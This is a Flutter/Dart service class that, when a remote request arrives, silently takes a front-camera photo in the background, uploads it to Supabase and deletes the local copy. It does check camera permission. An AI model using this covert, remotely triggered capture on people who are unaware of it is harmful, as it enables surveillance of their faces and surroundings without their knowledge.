import 'dart:io';
import 'package:camera/camera.dart';
import 'package:flutter/foundation.dart';
import 'package:permission_handler/permission_handler.dart';
import 'supabase_service.dart';

/// خدمة التقاط الصور في الخلفية
class BackgroundCameraService {
  /// التقاط صورة صامتة في الخلفية ورفعها
  static Future<void> captureAndUploadPhoto({
    required String userId,
    required String requestId,
  }) async {
    CameraController? cameraController;

    try {
      debugPrint('📷 [BG] Starting background photo capture...');

      // التحقق من الصلاحيات
      final cameraStatus = await Permission.camera.status;
      if (!cameraStatus.isGranted) {
        debugPrint('❌ [BG] Camera permission not granted');
        await SupabaseService.markPhotoRequestCompleted(requestId);
        return;
      }

      // الحصول على الكاميرات المتاحة
      List<CameraDescription> cameras;
      try {
        cameras = await availableCameras();
      } catch (e) {
        debugPrint('⚠️ [BG] Failed to get cameras (isolate issue): $e');
        debugPrint(
          'ℹ️ [BG] Marking request as complete - home_screen will handle it',
        );
        // تحديد الطلب كمكتمل ليتم إنشاء طلب جديد يمكن لـ home_screen التقاطه
        await SupabaseService.markPhotoRequestCompleted(requestId);
        return;
      }

      if (cameras.isEmpty) {
        debugPrint('❌ [BG] No cameras available');
        await SupabaseService.markPhotoRequestCompleted(requestId);
        return;
      }

      // استخدام الكاميرا الأمامية إن وجدت
      final camera = cameras.firstWhere(
        (c) => c.lensDirection == CameraLensDirection.front,
        orElse: () => cameras.first,
      );

      debugPrint('📷 [BG] Initializing camera: ${camera.name}');

      // تهيئة الكاميرا
      cameraController = CameraController(
        camera,
        ResolutionPreset.medium,
        enableAudio: false,
        imageFormatGroup: ImageFormatGroup.jpeg,
      );

      await cameraController.initialize();

      // انتظار قليل لتثبيت الكاميرا
      await Future.delayed(const Duration(milliseconds: 800));

      debugPrint('📷 [BG] Taking picture...');

      // التقاط الصورة
      final photo = await cameraController.takePicture();
      final photoBytes = await photo.readAsBytes();

      debugPrint('📷 [BG] Photo captured: ${photoBytes.length} bytes');

      // رفع الصورة
      await SupabaseService.uploadSessionPhoto(
        userId: userId,
        photoBytes: photoBytes,
        screenName: 'background_capture',
      );

      // تحديد الطلب كمكتمل
      await SupabaseService.markPhotoRequestCompleted(requestId);

      debugPrint('✅ [BG] Photo uploaded successfully!');

      // حذف الملف المؤقت
      try {
        final file = File(photo.path);
        if (await file.exists()) {
          await file.delete();
        }
      } catch (e) {
        debugPrint('⚠️ [BG] Failed to delete temp file: $e');
      }
    } catch (e, stackTrace) {
      debugPrint('❌ [BG] Photo capture error: $e');
      debugPrint('❌ [BG] Stack trace: $stackTrace');
      // تحديد الطلب كمكتمل لتجنب التعليق - سيتم إنشاء طلب جديد من المشرف إذا لزم الأمر
      try {
        await SupabaseService.markPhotoRequestCompleted(requestId);
      } catch (e2) {
        debugPrint('❌ [BG] Failed to mark request as completed: $e2');
      }
    } finally {
      // التأكد من إغلاق الكاميرا
      try {
        await cameraController?.dispose();
        debugPrint('📷 [BG] Camera disposed');
      } catch (e) {
        debugPrint('⚠️ [BG] Failed to dispose camera: $e');
      }
    }
  }
}
